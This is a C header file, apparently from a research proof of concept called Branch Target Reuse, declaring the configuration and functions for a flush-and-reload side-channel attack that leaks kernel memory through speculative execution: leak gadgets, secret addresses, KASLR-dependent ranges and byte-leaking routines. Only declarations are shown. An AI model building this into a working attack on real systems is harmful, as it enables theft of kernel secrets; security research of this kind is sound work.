/*
 * Branch Target Reuse (BTR)
 * April 30th 2026
 */

#ifndef _FLUSH_AND_RELOAD_H_
#define _FLUSH_AND_RELOAD_H_

#include <stdint.h>
#include "targets.h"
#include "../../../common/l2_eviction/evict_l2.h"

struct config {
    int fd_last_mapped_module;
    int fd_evict;
    int fd_get_filter_struct;

    int fd_evict_prog;
    int fd_get_prog_struct;
    int fd_time_prog;

    int fd_get_entry_point;
    int fd_read_entry_point;

    int l3_debug_timing;
    uint8_t debug_evict;

    uint8_t leak_mode;
    uint8_t gadget_nr;

    uint8_t * fr_buf;
    uint8_t * fr_buf_kern;
    uint8_t * reload_addr;
    uint8_t * secret_addr;
    uint8_t * secret_addr_kern;

    uint8_t * ind_map;
    uint8_t * ind_map_kern;

    uint64_t * ind_secret_addr;
    uint64_t * ind_base_addr;

    uint8_t * arg_tfp;
    uint8_t * arg_secret_address;
    uint8_t * arg_fr_buf;
    uint8_t * arg_ind_map;
    uint8_t * arg_cmp_value;


    void * ev_set_l1[L1_EVICT_SIZE];
    void * ev_set_l1_entry[L1_EVICT_SIZE];
    void * ev_set_l2_prog[L2_EVICT_SIZE];
    void * ev_set_l2_filter[L2_EVICT_SIZE];

    void * ev_set_l2[L2_EVICT_SIZE];
    void * ev_set_l3[L3_EVICT_SIZE];


    uint8_t do_evict;
    uint8_t use_proc_map;

    uint8_t capture_reuse_rate;

    uint8_t constant_blind_safe;

    // kaslr dependent
    uint8_t * phys_start;
    uint8_t * phys_end;
    uint8_t * text_start;

    uint64_t victim_branch_address;
    uint64_t speculation_target_address;
    uint64_t debug_gadget_address;
    uint64_t target_gadget_32;
    uint64_t leak_gadget_address[2];
    uint64_t base_address_offset;
    uint64_t secret_address_offset;
    uint64_t init_task_p;

};

uint8_t * evict_filter_struct(struct config * cfg);

uint64_t do_flush_and_reload(struct config * cfg, uint64_t iterations, uint8_t ret_on_hit);
int do_train_and_reload(struct config * cfg, uint64_t iterations, uint8_t ret_on_hit);

void print_leakage_rate(struct config * cfg, uint64_t iterations);
void print_reuse_rate(struct config * cfg);

void set_load_chain_leak_secret(struct config * cfg);
void set_load_chain_n_loads(struct config * cfg, int number_of_loads);
void set_load_chain_n_loads_debug(struct config * cfg, int number_of_loads);

void leak_test_leakage_rate(struct config * cfg);
void leak_dummy_secret(struct config * cfg);

uint64_t leak_64bit_value_forwards(struct config *, uint8_t * address, uint32_t prefix);

int is_signature_at_address(struct config * cfg, uint32_t signature, uint8_t * address, uint64_t iterations, uint8_t ret_on_hit);
void leak_n_bytes(struct config * cfg, char * buf, int n, uint8_t * address, uint32_t prefix);

void find_cmp_value(struct config * cfg);

#endif //_FLUSH_AND_RELOAD_H_
